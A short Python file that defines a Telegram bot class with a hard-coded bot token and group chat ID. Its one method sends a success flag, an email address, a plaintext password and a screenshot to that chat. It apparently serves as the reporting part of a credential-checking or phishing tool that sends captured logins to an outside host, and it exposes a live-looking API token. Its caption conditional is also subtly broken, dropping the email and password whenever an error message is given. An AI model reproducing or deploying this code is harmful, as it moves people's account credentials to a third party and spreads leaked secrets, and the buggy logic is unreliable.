from telegram import Bot
from telegram import InputFile


class TelegramBot(Bot):
    TOKEN = '6604061806:AAFtg3kePeu4wmTjSyc2yqo45Lw7MP6X5bY'
    CHAT_ID = '-938220241'

    def __init__(self):
        super().__init__(self.TOKEN)

    async def send_msg(self, success: bool, email: str, password: str, error_msg: str = None):
        with open('./screencap.png', 'rb') as image_file:
            image = InputFile(image_file)

        caption = (f"<b>Success:</b> {success}"
                   f" ({error_msg})\n" if error_msg is not None else f"<b>Success:</b> {success}\n"
                   f"<b>Email:</b> {email}\n"
                   f"<b>Password:</b> {password}\n")

        await self.send_photo(chat_id=self.CHAT_ID, photo=image, caption=caption, parse_mode='HTML')

